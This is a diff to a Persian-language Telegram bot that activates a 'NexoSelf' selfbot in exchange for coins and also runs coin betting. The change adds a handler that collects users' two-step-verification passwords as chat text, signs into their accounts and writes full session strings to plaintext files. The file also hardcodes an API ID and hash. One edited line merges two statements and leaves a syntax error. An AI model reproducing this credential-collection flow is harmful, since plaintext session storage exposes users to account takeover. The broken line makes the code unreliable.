@@ -100,7 +100,8 @@ class TelegramAuthBot:
                     MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_phone_number)
                 ],
                 GET_CODE: [
-                    CallbackQueryHandler(self.verify_code, pattern='^.*$')
+                    CallbackQueryHandler(self.verify_code, pattern='^.*$'),
+                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_password_input)
                 ],
                 COIN_PURCHASE: [
                     CallbackQueryHandler(self.coin_purchase, pattern='^.*$')
@@ -111,7 +112,7 @@ class TelegramAuthBot:
             },
             fallbacks=[
                 CommandHandler('cancel', self.cancel),
-                CommandHandler('start', self.start)  # اضافه شدن برای پاسخ مجدد به /start
+                CommandHandler('start', self.start)
             ],
             per_message=False
         )
@@ -276,7 +277,7 @@ class TelegramAuthBot:
                 except:
                     pass
 
-        # هدیه اولیه (تغییر به 5 سکه)
+        # هدیه اولیه
         if user_id not in self.user_first_start and not self.is_owner(user_id):
             self.user_first_start[user_id] = True
             if user_id not in self.user_coins:
@@ -287,7 +288,7 @@ class TelegramAuthBot:
                     "💰 موجودی فعلی: 5 سکه"
                 )
 
-        # نمایش مستقیم پنل فعال‌سازی (بدون نیاز به جوین)
+        # نمایش پنل فعال‌سازی
         activation_text = (
             "💡 **فعال‌سازی سلف خود را از منوی زیر شروع کنید** 🔋\n\n"
             "🚀 **برای فعال‌سازی سلف، روی دکمه زیر کلیک کنید** ⚙️"
@@ -374,7 +375,6 @@ class TelegramAuthBot:
             return ACTIVATION_PANEL
 
     async def show_stats_panel(self, query):
-        """نمایش پنل آمار و موجودی"""
         user_id = query.from_user.id
         user_coins = self.user_coins.get(user_id, 0)
         total_value = user_coins * 200
@@ -395,7 +395,6 @@ class TelegramAuthBot:
         )
 
     async def show_invite_panel(self, query, context: ContextTypes.DEFAULT_TYPE):
-        """نمایش پنل لینک دعوت"""
         user_id = query.from_user.id
         username = query.from_user.username or f"user_{user_id}"
         
@@ -572,6 +571,8 @@ class TelegramAuthBot:
                     'entered_code': ''
                 }
                 
+                context.user_data['waiting_for_password'] = False
+                
                 code_message = (
                     "🔓 **کد تأیید خود را وارد کنید** 💫\n\n"
                     "از کیبورد زیر برای وارد کردن کد ۵ رقمی استفاده کنید 🧩"
@@ -710,7 +711,6 @@ class TelegramAuthBot:
             success = await self.activate_selfbot(session_string, user_id, phone_number)
             
             if success:
-                # کسر 5 سکه از موجودی کاربر
                 if user_id in self.user_coins and self.user_coins[user_id] >= 5:
                     self.user_coins[user_id] -= 5
                 
@@ -735,10 +735,9 @@ class TelegramAuthBot:
             return ConversationHandler.END
             
         except SessionPasswordNeededError:
-            # مدیریت رمز دو مرحله‌ای
             await query.edit_message_text(
                 "🔐 حساب شما دارای رمز دومرحله‌ای است.\n"
-                "لطفاً رمز عبور خود را به صورت متن ارسال کنید.\n"
+                "لطفاً رمز عبور خود را به صورت **متن** در همین چت ارسال کنید.\n"
                 "اگر رمز ندارید، روی دکمه '⏭️ رد شدن' کلیک کنید.",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("⏭️ رد شدن (بدون رمز)", callback_data="skip_password")]
@@ -777,10 +776,83 @@ class TelegramAuthBot:
             
             return ConversationHandler.END
 
+    async def handle_password_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """دریافت رمز دو مرحله‌ای از کاربر"""
+        user_id = update.message.from_user.id
+        password = update.message.text.strip()
+        
+        # بررسی اینکه آیا کاربر در حالت وارد کردن رمز است
+        if not context.user_data.get('waiting_for_password', False):
+            return
+        
+        if user_id not in self.user_sessions:
+            await update.message.reply_text(
+                "❌ سشن شما منقضی شده است. لطفاً دوباره /start را ارسال کنید."
+            )
+            return
+        
+        session_data = self.user_sessions[user_id]
+        client = session_data['client']
+        phone_number = session_data['phone_number']
+        
+        await update.message.reply_text("⏳ در حال بررسی رمز و ورود به اکانت...")
+        
+        try:
+            await client.sign_in(password=password)
+            
+            await update.message.reply_text("✅ رمز دو مرحله‌ای صحیح است! در حال فعال‌سازی NexoSelf...")
+            
+            session_string = client.session.save()
+            
+            success = await self.activate_selfbot(session_string, user_id, phone_number)
+            
+            if success:
+                if user_id in self.user_coins and self.user_coins[user_id] >= 5:
+                    self.user_coins[user_id] -= 5
+                
+                await update.message.reply_text(
+                    "🎉 **NexoSelf با موفقیت فعال شد!**\n\n"
+                    "✅ اکانت شما با موفقیت تأیید شد\n"
+                    "✅ NexoSelf به صورت خودکار اجرا شد\n"
+                    "💰 5 سکه از حساب شما کسر شد\n"
+                    "🔮 اکنون می‌توانید از دستورات NexoSelf استفاده کنید."
+                )
+            else:
+                await update.message.reply_text(
+                    "⚠️ **ورود موفق اما خطا در اجرای NexoSelf**\n\n"
+                    "✅ اکانت شما تأیید شد\n"
+                    "❌ خطا در اجرای خودکار NexoSelf"
+                )
+            
+            context.user_data['waiting_for_password'] = False
+            if user_id in self.user_sessions:
+                await self.user_sessions[user_id]['client'].disconnect()
+                del self.user_sessions[user_id]
+            
+            return ConversationHandler.END
+            
+        except Exception as e:
+            error_msg = str(e)
+            if "PASSWORD_HASH_INVALID" in error_msg or "PASSWORD" in error_msg:
+                await update.message.reply_text(
+                    "❌ رمز دو مرحله‌ای اشتباه است!\n"
+                    "لطفاً رمز صحیح را وارد کنید.\n"
+                    "اگر رمز ندارید، روی دکمه '⏭️ رد شدن' کلیک کنید.",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("⏭️ رد شدن (بدون رمز)", callback_data="skip_password")]
+                    ])
+                )
+                return GET_CODE
+            else:
+                await update.message.reply_text(
+                    f"❌ خطا در ورود با رمز دو مرحله‌ای: {error_msg}\n"
+                    "لطفاً دوباره تلاش کنید."
+                )
+                return GET_CODE
+
     async def skip_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """رد شدن از رمز دو مرحله‌ای و ورود بدون رمز"""
-        query = update.callback_query
-        await query.answer()
+        query = update.callback_query        await query.answer()
         
         user_id = query.from_user.id
         
@@ -797,7 +869,6 @@ class TelegramAuthBot:
         await query.edit_message_text("⏳ در حال ورود بدون رمز دو مرحله‌ای...")
         
         try:
-            # تلاش برای ورود بدون رمز
             await client.sign_in(password=None)
             
             await query.edit_message_text("✅ ورود بدون رمز دو مرحله‌ای موفقیت‌آمیز بود!")
@@ -807,7 +878,6 @@ class TelegramAuthBot:
             success = await self.activate_selfbot(session_string, user_id, phone_number)
             
             if success:
-                # کسر 5 سکه از موجودی کاربر
                 if user_id in self.user_coins and self.user_coins[user_id] >= 5:
                     self.user_coins[user_id] -= 5
                 
@@ -825,6 +895,7 @@ class TelegramAuthBot:
                     "❌ خطا در اجرای خودکار NexoSelf"
                 )
             
+            context.user_data['waiting_for_password'] = False
             if user_id in self.user_sessions:
                 await self.user_sessions[user_id]['client'].disconnect()
                 del self.user_sessions[user_id]
@@ -839,14 +910,11 @@ class TelegramAuthBot:
             return GET_CODE
 
     async def activate_selfbot(self, session_string: str, user_id: int, phone_number: str):
-        """فعال‌سازی خودکار NexoSelf"""
         try:
-            # ذخیره سشن در فایل موقت
             temp_file = f"session_{user_id}.txt"
             with open(temp_file, 'w') as f:
                 f.write(session_string)
             
-            # اجرای سلف بات در فرآیند جداگانه
             subprocess.Popen([
                 sys.executable, 'self.py',
                 '--session', temp_file,
@@ -854,7 +922,6 @@ class TelegramAuthBot:
                 '--api-hash', self.api_hash
             ])
             
-            # ذخیره اطلاعات در دیتابیس
             conn = sqlite3.connect('users.db')
             cursor = conn.cursor()
             cursor.execute('''INSERT OR REPLACE INTO users 
@@ -876,6 +943,8 @@ class TelegramAuthBot:
             await self.user_sessions[user_id]['client'].disconnect()
             del self.user_sessions[user_id]
         
+        context.user_data['waiting_for_password'] = False
+        
         await update.message.reply_text(
             "❌ عملیات لغو شد.\n\n"
             "برای شروع مجدد /start را ارسال کنید."
@@ -885,7 +954,6 @@ class TelegramAuthBot:
     # ============ متدهای شرط‌بندی و انتقال سکه ============
 
     async def create_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """ایجاد شرط‌بندی جدید"""
         user_id = update.message.from_user.id
         username = update.message.from_user.username or f"user_{user_id}"
         
@@ -945,12 +1013,10 @@ class TelegramAuthBot:
             await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
 
     async def create_group_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """ایجاد شرط‌بندی گروهی"""
         user_id = update.message.from_user.id
         username = update.message.from_user.username or f"user_{user_id}"
         chat_id = update.message.chat_id
         
-        # بررسی اینکه آیا در گروه هستیم
         if update.message.chat.type == 'private':
             await update.message.reply_text(
                 "❌ این دستور فقط در گروه‌ها قابل استفاده است!\n"
@@ -1008,15 +1074,13 @@ class TelegramAuthBot:
             
             self.group_bets[bet_id]['message_id'] = message.message_id
             
-            # زمان‌بندی برای پایان شرط
             asyncio.create_task(self.finish_group_bet(bet_id, context))
             
         except ValueError:
             await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
 
     async def finish_group_bet(self, bet_id: str, context: ContextTypes.DEFAULT_TYPE):
-        """پایان دادن به شرط‌بندی گروهی پس از 5 دقیقه"""
-        await asyncio.sleep(300)  # 5 دقیقه
+        await asyncio.sleep(300)
         
         if bet_id not in self.group_bets:
             return
@@ -1024,7 +1088,6 @@ class TelegramAuthBot:
         bet = self.group_bets[bet_id]
         
         if len(bet['participants']) < 2:
-            # بازگشت سکه‌ها به سازنده
             if bet['creator_id'] in self.user_coins:
                 self.user_coins[bet['creator_id']] += bet['coin_amount']
             
@@ -1046,7 +1109,6 @@ class TelegramAuthBot:
             del self.group_bets[bet_id]
             return
         
-        # انتخاب برنده
         winner_id = random.choice(bet['participants'])
         total_coins = bet['coin_amount'] * len(bet['participants'])
         
@@ -1054,7 +1116,6 @@ class TelegramAuthBot:
             self.user_coins[winner_id] = 0
         self.user_coins[winner_id] += total_coins
         
-        # پیدا کردن نام برنده
         winner_username = bet['creator_username'] if winner_id == bet['creator_id'] else "یکی از شرکت‌کنندگان"
         
         result_text = (
@@ -1075,7 +1136,6 @@ class TelegramAuthBot:
         except:
             pass
         
-        # اطلاع به برنده
         try:
             await context.bot.send_message(
                 chat_id=winner_id,
@@ -1225,7 +1285,6 @@ class TelegramAuthBot:
             await query.answer("❌ فقط سازنده شرط می‌تواند آن را لغو کند!", show_alert=True)
             return
         
-        # بازگشت سکه‌ها به همه شرکت‌کنندگان
         for participant_id in bet['participants']:
             if participant_id in self.user_coins:
                 self.user_coins[participant_id] += bet['coin_amount']
@@ -1542,7 +1601,6 @@ if __name__ == "__main__":
     API_ID = 34434623
     API_HASH = "d82c5dd13602eedc3041e9f549bcd813"
     
-    # ایجاد پوشه database اگر وجود ندارد
     if not os.path.exists("database"):
         os.makedirs("database")
     
